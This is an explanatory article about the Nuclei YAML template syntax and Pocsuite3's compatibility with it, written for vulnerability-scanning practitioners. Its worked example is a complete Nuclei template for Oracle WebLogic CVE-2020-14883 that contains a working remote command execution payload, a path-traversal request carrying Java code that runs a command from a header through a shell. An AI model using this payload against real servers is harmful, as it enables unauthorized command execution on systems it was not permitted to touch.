**Author: fenix@Knownsec 404 Team  
Chinese version: **
## Introduction
Pocsuite3 is an open source remote vulnerability testing framework built by
Knownsec 404 Team based on the GPLv2 license [1](https://pocsuite.org
"Pocsuite3 框架"). The framework itself is developed using Python3 and
integrates the APIs of many security services such as ZoomEye, Shodan, CEye,
Interactsh, etc. Users can quickly write PoC/Exp based on Pocsuite3, verify
the vulnerability of batch targets and obtain summary results.
Nuclei is a customized, fast vulnerability scanner based on YAML syntax
templates open sourced by projectdiscovery
[2](https://nuclei.projectdiscovery.io " Nuclei 框架"). Nuclei defines a set of
syntax for sending requests to the target and matching the response to
determine whether the vulnerability has been successfully verified. It
supports TCP, HTTP and other protocols. Nuclei's community is very active, and
the nuclei-templates project provides thousands of community-maintained PoC
templates [3](https://github.com/projectdiscovery/nuclei-templates "nuclei-templates 项目").
Compared with Nuclei, Pocsuite3 is more flexible and can directly use a large
number of third-party libraries. It is very convenient for some
vulnerabilities involving complex protocols, and users can quickly get started
as long as they can write Python. Starting from the `2.0.0` version, Pocsuite3
supports PoC in YAML format and is compatible with Nuclei, and can directly
use the Nuclei template.
This article briefly talks about the Nuclei YAML syntax template and how
Pocsuite3 is compatible. Further details about Nuclei templates can be found
in the official Nuclei documentation.
## Nuclei YAML syntax template
YAML is a data serialization language commonly used to write configuration
files. Its basic syntax rules are as follows (source: Ruan Yifeng's YAML
Language Tutorial【4】).
>   * Case sensitivity.
>   * Use indentation to represent hierarchical relationships.
>   * Tab key is not allowed when indenting, only spaces are allowed.
>   * The number of indented spaces does not matter,, as long as the elements
> of the same level are aligned to the left.
>
`#` Represents a comment, which is ignored by the parser from this character
to the end of the line.
There are three types of data structures supported by YAML.
>   * Object: A collection of key-value pairs, represented by a colon
> structure.
>   * Array: A set of values in order, also known as a sequence / list. A set
> of lines at the beginning of a hyphen that forms an array. If the child
> members of the data structure are an array, you can indent a space below the
> item.
>   * Scalars: Single, non-separable values, such as strings, integers,
> Booleans, etc.
>
Take `nuclei-templates/cves/2020/CVE-2020-14883.yaml` as an example:
    id: CVE-2020-14883
    info:
      name: Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution
      author: pdteam
      severity: high
      description: The Oracle Fusion Middleware WebLogic Server admin console in versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is vulnerable to an easily exploitable vulnerability that allows high privileged attackers with network access via HTTP to compromise Oracle WebLogic Server.
      reference:
        - https://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14883
        - https://www.oracle.com/security-alerts/cpuoct2020.html
        - http://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html
      classification:
        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
        cvss-score: 7.2
        cve-id: CVE-2020-14883
      tags: oracle,rce,weblogic,kev,packetstorm,cve,cve2020
    requests:
      - raw:
          - |
            POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1
            Host: {{Hostname}}
            Accept-Language: en
            CMD: {{cmd}}
            Content-Type: application/x-www-form-urlencoded
            Accept-Encoding: gzip, deflate
            test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("CMD");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
        payloads:
          cmd:
            - id
        matchers-condition: and
        matchers:
          - type: word
            part: header
            words:
              - "ADMINCONSOLESESSION"
          - type: word
            part: body
            words:
              - 'uid='
              - 'gid='
              - 'groups='
            condition: and
          - type: status
            status:
              - 200
        extractors:
          - type: regex
            regex:
              - "(u|g)id=.*"
    # Enhanced by mp on 2022/04/20
This template can be roughly divided into the following parts:
    id: str  # The template's unique ID, a required field.
    info: {k: v}  # Vulnerability information fields, including vulnerability name, author, vulnerability severity, vulnerability description, reference connection, score, vulnerability label, etc., are basically optional fields.
    variables: {k: v}  # Global variable, the value can be a string or an expression, not provided in the template above.
    requests: []  # HTTP requests defined (core part)
At the core is the requests section, which stands for defining an HTTP
request. Nuclei supports a variety of protocols. For example, if you want to
define TCP requests, you need to use the network field.
The syntax of requests is as follows, and each element contains
single/multiple HTTP requests, payloads (optional), matching rules, and
decompression rules (optional). In most cases, defining one is sufficient.
    requests
      # Method 1: raw request
      - raw:
          - |
            GET /index.php HTTP/1.1   
          - |
            POST /index.php HTTP/1.1
            Host: {{Hostname}}
            Accept-Language: en
            ...
      # Method 2: GET, POST, PUT, DELETE request
      - method: GET
        path:
          - "{{BaseURL}}/login.php"
          - "{{BaseURL}}/index.php"  
        headers: {}  
        # payload combination mode
        attack: clusterbomb
        # The provided payload is used to request filling
        payloads: {}
        # Decompression rules are used to extract information from the previous request response for subsequent request filling or result return.
        extractors: []
        # Match the defined requests after sending them
        req-condition: false
        # Return when the first match is hit
        stop-at-first-match: true
        # Logical relationship of matching rules. If it is and, all matching conditions must be true.
        matchers-condition: and
        # Matching Rules
        matchers: []
Two methods are supported for defining http requests: 1. define method, path,
headers, and body respectively; 2. Provide the original http request directly.
The request will contain a dynamic value in the form of `{{variable name or
expression}}`, which needs to be replaced before sending the request. The
variable namespace is provided by the value extracted from variables,
payloads, and extractors, as well as the target url. Dynamic values will also
be included in decompression rules and matching rules.
Extractors have the following types:
  1. regex, regular extraction; 
  2. kval, a key pair, such as extracting the specified response header; 
  3. JSON, using the syntax of JQ to extract JSON data; 
  4. xpath, use xpath to extract html response data; 
  5. DSL, using expression extraction, not commonly used. 
The decompression rules of `WebLogic CVE-2020-14883` are defined as follows,
and the execution results of the id command are extracted using regular rules.
    extractors:
          - type: regex
            regex:
              - "(u|g)id=.*"
The types of matchers are defined as follows:
  1. status, matching the HTTP response status code; 
  2. size, matching length, such as Conteng-Length; 
  3. Word, string matching; 
  4. regex, regular matching; 
  5. binary, binary data matching; 
  6. DSL, using complex expressions for matching; 
For example:
    matchers:
      # Performs a string match for the response headers
      - type: word
        part: header
        words:
          - "ADMINCONSOLESESSION"
      # String matching is performed on the response body, and all substrings should be included.